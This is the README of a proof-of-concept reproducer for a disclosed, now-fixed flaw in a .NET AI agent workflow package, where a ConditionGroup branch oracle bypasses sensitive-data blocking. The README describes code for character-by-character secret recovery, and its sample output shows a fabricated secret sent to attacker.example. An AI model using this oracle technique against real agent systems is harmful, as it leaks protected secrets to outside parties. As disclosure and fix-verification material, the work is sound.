# PoC — GHSA-4532-fhjf-wq2q (Agent Framework declarative ConditionGroup sensitivity bypass)

Local, fabricated-data reproducer. It runs against the **published** NuGet package
`Microsoft.Agents.AI.Workflows.Declarative` **1.24.0** (the release that fixed the sibling
GHSA-9f26-7mqc-9vc4), with no network and a fabricated secret (`sk_live_SECRETBIT`). It demonstrates the
public, now-fixed bypass; it does not target any real system.

> For defensive verification only. The issue is fixed in **1.26.0** — build against 1.24.0 to observe the
> pre-fix behavior, or against 1.26.0 to confirm the fix (scenario C then also BLOCKs).

## Layout

| Path | What it shows |
|---|---|
| `01-conditiongroup/` | The primary finding on `ConditionGroupExecutor`. |
| `01-conditiongroup/Program.cs` | Three scenarios A/B/C: direct use, derived value, and the ConditionGroup oracle. |
| `01-conditiongroup/Chain.cs` | End-to-end: reconstruct the full secret and forward it in one `HttpRequestAction`. |
| `01-conditiongroup/Extract.cs` | Character-by-character secret recovery via the branch oracle. |
| `01-conditiongroup/captured-output.txt` | The run output (A/B BLOCKED, C EMITTED, secret recovered, `match=True`). |
| `01-conditiongroup/OraclePoc.csproj` | Project file (net10.0, references the published 1.24.0 package). |
| `02-questionexecutor-sibling/` | The strongest control-flow sibling (`QuestionExecutor`, `RepeatCount` channel), same root cause. |
| `*/EVIDENCE.md` | Per-scenario evidence notes. |

## Expected result (pre-fix, 1.24.0)

```
[A direct]           expect=BLOCK -> BLOCKED  (boundary held)
[B derived]          expect=BLOCK -> BLOCKED  (boundary held)
[C condition-oracle] expect=BLOCK -> EMITTED  OUT=prefix_is_sk_live   >>> BOUNDARY BYPASSED
[chain]  attacker sink received URL: https://attacker.example/collect?d=sk_live_SECRETBIT
[D extraction] recovered secret = "sk_live_SECRETBIT"  match=True
```

A and B confirm the data-flow boundary is active; C is the control-flow bypass. On **1.26.0**, scenario C
BLOCKs as well, because the condition is now routed through `GetNonSensitiveValue`.

## Run

```bash
cd 01-conditiongroup
dotnet run           # requires the .NET SDK; restores Microsoft.Agents.AI.Workflows.Declarative 1.24.0
```
